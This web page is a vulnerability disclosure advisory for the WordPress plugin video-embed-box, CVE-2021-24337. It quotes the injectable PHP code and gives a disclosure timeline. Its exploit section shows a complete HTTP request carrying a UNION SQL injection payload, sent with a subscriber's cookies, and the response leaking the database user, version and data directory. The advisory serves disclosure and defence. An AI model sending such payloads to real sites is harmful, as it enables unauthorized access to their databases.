<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
      <title>wp-plugin : video-embed-box | Code Vigilant : to err is human.. To fix is Humanity</title>
    
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
<a href="https://codevigilant.com"><img src="/banner.png" class="header-image" width="508" height="111" alt=""  /></a>

<nav class="menu">
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/" >
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item menu__dropdown">
			<a class="menu__link" href="/disclosure/">
				
				<span class="menu__text">Disclosure</span>

				
			</a>
			<input type="checkbox" id="Disclosure">
			<ul class="submenu__list">
				
					<li class="menu__item">
					<a class="menu__link" href="/category/injection/">
						
						<span class="menu__text">INJECTION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/cross-site-scripting-xss/">
						
						<span class="menu__text">CROSS-SITE SCRIPTING (XSS)</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/information-disclosure/">
						
						<span class="menu__text">INFORMATION DISCLOSURE</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/local-file-inclusion/">
						
						<span class="menu__text">LOCAL FILE INCLUSION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/ssrf/">
						
						<span class="menu__text">SSRF/XSPA</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/components-with-known-vulnerabilities/">
						
						<span class="menu__text">COMPONENTS WITH KNOWN VULNERABILITIES</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/unvalidated-redirects-and-forwards/">
						
						<span class="menu__text">UNVALIDATED REDIRECTS AND FORWARDS</span>
						
					</a>
					</li>
				
			</ul>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/blog/" >
				
				<span class="menu__text">Blog</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/feed.xml" >
				
				<span class="menu__text">RSS Feed</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about-team/" >
				
				<span class="menu__text">About Team</span>
				
			</a>
		</li>
	</ul>
</nav>



<main>
	<br />
<center><a href=""><span class="title">Wp Plugin Video Embed Box</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/video-embed-box/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : video-embed-box</a></div>
<div>Effected Version : 1 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/injection/">Injection</a></div>
<div>Minimum Level of Access Required : Subscriber</div>
<div>CVE Number : CVE-2021-24337</div>
<div>Identified by : <a href="/author/syed_sheeraz_ali/">Syed Sheeraz Ali</a></div>
<div><a href="https://wpscan.com/plugin/video-embed-box/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>April 19, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	<li>
	April 19, 2021 : Plugin  Closed</li>
	
	
	<li>May 17, 2021 : CVE Assigned</li>
	
	<li>May 19, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<p>Vulnerable File: <code>video-embed-box/video_embed.php</code></p>
<p>Vulnerable Code block and parameter:</p>
<ol>
<li>Subscriber level SQLi for parameter <code>id</code></li>
</ol>
<p><a href="https://plugins.trac.wordpress.org/browser/video-embed-box/tags/1.0/video_embed.php#L133" target="_blank" rel="noreferrer noopener nofollow">video_embed.php#L133</a>
</p>
<pre><code>133:	$data = $wpdb-&gt;get_row('SELECT * FROM '.$wpdb-&gt;prefix.'video_embed WHERE `id` =  ' . $_GET['id']);
</code></pre><p><a href="https://plugins.trac.wordpress.org/browser/video-embed-box/tags/1.0/video_embed.php#L149" target="_blank" rel="noreferrer noopener nofollow">video_embed.php#L149</a>
</p>
<pre><code>149:   $data = $wpdb-&gt;get_row('SELECT * FROM '.$wpdb-&gt;prefix.'video_embed WHERE `id` =  ' . $_GET['id']);
</code></pre><p>SQL Injection Type: Union Injection</p>
<h4 id="poc-screenshot">PoC Screenshot:</h4>
<p><img src="/disclosure_screenshots/video_embed_box_poc2.jpg" alt="PoC Screenshot"></p>
<h4 id="exploit">Exploit</h4>
<p>Note: The URL <code>/wp-admin/admin.php?page=edit-video-embed&amp;id=1</code> is not directly in the menu but can be accessed by forced browsing.</p>
<p>Vulnerable Request</p>
<pre><code>GET http://172.28.128.50/wp-admin/admin.php?page=edit-video-embed&amp;id=0+union+select+1%2Ccurrent_user%28%29%2C3%2Cdatabase%28%29%2C%40%40version%2C6%2C@@datadir%3B HTTP/1.1
Proxy-Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=subscriber%7C1618790564%7C0qlXExEKjk34FZ7be4MClfw98F3gZoxsxytpAOfFs75%7C3a5e9dc3612bf83b3f1c67e85a93429447e982b7d5c358c78cc972498751d75f; wordpress_test_cookie=WP%20Cookie%20check; tk_ai=woo%3A8bv%2FYCyGDyRrTTfoyEtt3v9r; PHPSESSID=39fb60f8461711922fbba5740e25022e; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=subscriber%7C1618790564%7C0qlXExEKjk34FZ7be4MClfw98F3gZoxsxytpAOfFs75%7C6fbbddf7e66c3bcefdee913303a45f2312c191aad9a7395257f6e23a60aa94c9; wp-settings-time-4=1618619117
Host: 172.28.128.50

</code></pre><p>Response</p>
<pre><code>HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 17 Apr 2021 00:25:43 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin
Set-Cookie: wp-settings-4=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Set-Cookie: wp-settings-time-4=1618619143; expires=Sun, 17-Apr-2022 00:25:43 GMT; Max-Age=31536000; path=/

&lt;...... snip ......&gt;
				&lt;form action=&quot;&quot; method=&quot;post&quot; name=&quot;video_embed&quot; style=&quot;float: left; width: 100%;&quot; id=&quot;video_embed&quot;&gt;
			&lt;table&gt;
				&lt;tr&gt;
					&lt;td&gt;Title: &lt;/td&gt;
					&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;bob@localhost&quot; /&gt;&lt;/td&gt;
				&lt;/tr&gt;
				&lt;tr style=&quot;height: 50px;&quot;&gt;
					&lt;td&gt;Video from: &lt;/td&gt;
					&lt;td&gt;
						&lt;input type=&quot;radio&quot; name=&quot;video_embed_for&quot;  value=&quot;youtube&quot; /&gt; Youtube / Vimeo
						&lt;input type=&quot;radio&quot; name=&quot;video_embed_for&quot;  value=&quot;videosuit&quot; /&gt; VideoSuit
					&lt;/td&gt;
				&lt;/tr&gt;
				&lt;tr&gt;
					&lt;td&gt;Youtube Embed Url: &lt;/td&gt;
					&lt;td&gt;
						&lt;input type=&quot;text&quot; name=&quot;url&quot; value=&quot;wp&quot;/&gt;
												&lt;td&gt;&lt;p style=&quot;font-size: 11px;&quot;&gt;Please specify complete path(including 'http')&lt;/p&gt;&lt;/td&gt;
					&lt;/td&gt;
				&lt;/tr&gt;
				&lt;tr&gt;
					&lt;td&gt;Pdf Path: &lt;/td&gt;
					&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;pdf&quot; value=&quot;8.0.23-0ubuntu0.20.04.1&quot; /&gt;&lt;/td&gt;
					&lt;td&gt;&lt;p style=&quot;font-size: 11px;&quot;&gt;Please specify complete path(including 'http')&lt;/p&gt;&lt;/td&gt;
				&lt;/tr&gt;
				&lt;tr&gt;
					&lt;td&gt;Audio Path: &lt;/td&gt;
					&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;audio&quot; value=&quot;6&quot; /&gt;&lt;/td&gt;
					&lt;td&gt;&lt;p style=&quot;font-size: 11px;&quot;&gt;Please specify complete path(including 'http')&lt;/p&gt;&lt;/td&gt;
				&lt;/tr&gt;
				&lt;tr&gt;
					&lt;td&gt;Useful Link: &lt;/td&gt;
					&lt;td&gt;&lt;textarea name=&quot;useful_link&quot;&gt;/var/lib/mysql/&lt;/textarea&gt;&lt;/td&gt;
					&lt;td&gt;&lt;p style=&quot;font-size: 11px;&quot;&gt;Please specify your html content&lt;/p&gt;&lt;/td&gt;
				&lt;/tr&gt;
				&lt;tr&gt;
					&lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;Save&quot;/&gt;
					&lt;td&gt;&lt;input type=&quot;hidden&quot; name=&quot;saved&quot; value=&quot;1&quot; /&gt;&lt;/td&gt;
				&lt;/tr&gt;
			&lt;/table&gt;
		&lt;/form&gt;
	&lt;/div&gt;

&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;!-- wpbody-content --&gt;

&lt;...... snip ......&gt;
</code></pre>

<br />


</main>

  <footer>
  
  
  <hr/>
  Â© <a href="https://anantshri.info">Anant Shrivastava</a> 2021
  
  </footer>
  </body>
</html>

